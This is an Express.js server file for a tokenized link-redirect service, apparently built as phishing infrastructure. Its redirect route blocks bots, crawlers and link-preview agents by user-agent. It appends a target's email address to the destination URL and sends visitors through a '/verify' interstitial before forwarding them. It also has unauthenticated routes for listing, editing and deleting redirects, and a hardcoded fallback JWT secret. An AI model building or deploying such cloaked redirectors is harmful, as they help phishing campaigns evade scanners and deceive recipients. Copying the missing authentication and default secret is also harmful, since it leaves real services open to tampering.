require('dotenv').config();
const express = require('express');
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const rateLimit = require('express-rate-limit');
const db = require('./db'); // MongoDB via Mongoose

const app = express();
const PORT = process.env.PORT || 3000;

// Configuration
const JWT_SECRET = process.env.JWT_SECRET || 'your_strong_secret_key';
const ENCRYPTION_KEY = crypto.createHash('sha256').update(JWT_SECRET).digest();
const IV_LENGTH = 16;

// Middleware
app.use(express.static('public'));
app.use(express.json());

// Rate limiting
const limiter = rateLimit({
    windowMs: 60 * 1000,
    max: 10,
    message: 'Too many requests. Please try again later.',
});
app.use(limiter);

// Helper functions
function generateUniqueKey() {
    return crypto.randomBytes(8).toString('hex');
}

function generateToken(key) {
    return jwt.sign({ key }, JWT_SECRET);
}

/* ----------------------------------------------------------
   STEP 2 — ADD VERIFICATION ROUTE (SERVE VERIFY.HTML)
------------------------------------------------------------*/

app.get('/verify', (req, res) => {
    res.sendFile(__dirname + '/public/verify.html');
});

/* ----------------------------------------------------------
   ADD-REDIRECT (unchanged)
------------------------------------------------------------*/

app.post('/add-redirect', async (req, res) => {
    const { destination } = req.body;

    if (!destination || !/^https?:\/\//.test(destination)) {
        console.log('Invalid destination:', destination);
        return res.status(400).json({ message: 'Invalid destination URL.' });
    }

    const key = generateUniqueKey();
    const token = generateToken(key);

    try {
        await db.addRedirect(key, destination, token);
        const baseUrl = req.protocol + '://' + req.get('host');

        res.json({
            message: 'Redirect added successfully!',
            redirectUrl: `${baseUrl}/${key}?token=${token}`,
            pathRedirectUrl: `${baseUrl}/${key}/${token}`,
        });
    } catch (err) {
        console.error('DB error on addRedirect:', err);
        res.status(500).json({ message: 'Failed to save redirect.' });
    }
});

/* ----------------------------------------------------------
   VERIFY AND REDIRECT ROUTE
   STEP 3 — UPDATE TO SHOW VERIFICATION PAGE BEFORE REDIRECT
------------------------------------------------------------*/

app.get('/:key/:token', async (req, res) => {
    const { key, token } = req.params;
    const email = req.query.email || null;
    const userAgent = req.headers['user-agent'] || '';

    // Block bots
    if (/bot|crawl|spider|preview/i.test(userAgent)) {
        return res.status(403).send('Access denied.');
    }

    // Validate email formatting
    if (email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        return res.status(400).send('Invalid email format.');
    }

    try {
        // Verify token
        const decoded = jwt.verify(token, JWT_SECRET);

        // Fetch from DB
        const row = await db.getRedirect(key);
        if (!row) {
            console.log('Redirect not found for key:', key);
            return res.status(404).send('Redirect not found.');
        }

        if (row.token !== token) {
            console.log('Invalid token for key:', key);
            return res.status(403).send('Invalid token.');
        }

        let destination = row.destination;

        // Append email to destination if provided
        if (email) {
            destination = destination.endsWith('/')
                ? destination + email
                : `${destination}/${email}`;
        }

        console.log('Outgoing destination ->', destination);

        /* -------------------------------------------------------
           IMPORTANT CHANGE:
           Instead of redirecting directly:
               res.redirect(destination);

           We now send user to:
               /verify?dest=<encodedDestination>
        --------------------------------------------------------*/

        return res.redirect(`/verify?dest=${encodeURIComponent(destination)}`);

    } catch (err) {
        console.log('JWT verification or DB error:', err.message);
        return res.status(403).send('Invalid or expired token.');
    }
});

/* ----------------------------------------------------------
   CRUD ROUTES (unchanged)
------------------------------------------------------------*/

app.get('/redirects', async (req, res) => {
    try {
        const redirects = await db.getAllRedirects();
        res.json(redirects);
    } catch (err) {
        res.status(500).json({ message: 'Failed to fetch redirects' });
    }
});

app.put('/redirects/:key', async (req, res) => {
    const { key } = req.params;
    const { destination } = req.body;

    if (!destination || !/^https?:\/\//.test(destination)) {
        return res.status(400).json({ message: 'Invalid destination URL.' });
    }

    try {
        await db.updateRedirect(key, destination);
        res.json({ message: 'Redirect updated.' });
    } catch (err) {
        res.status(500).json({ message: 'Failed to update redirect.' });
    }
});

app.delete('/redirects/:key', async (req, res) => {
    const { key } = req.params;
    try {
        await db.deleteRedirect(key);
        res.json({ message: 'Redirect deleted.' });
    } catch (err) {
        res.status(500).json({ message: 'Failed to delete redirect.' });
    }
});

/* ----------------------------------------------------------
   404 fallback
------------------------------------------------------------*/

app.use((req, res) => {
    res.status(404).send('Error: Invalid request.');
});

/* ----------------------------------------------------------
   START SERVER
------------------------------------------------------------*/

app.listen(PORT, () => {
    console.log(`Server running on https://localhost:${PORT}`);
});
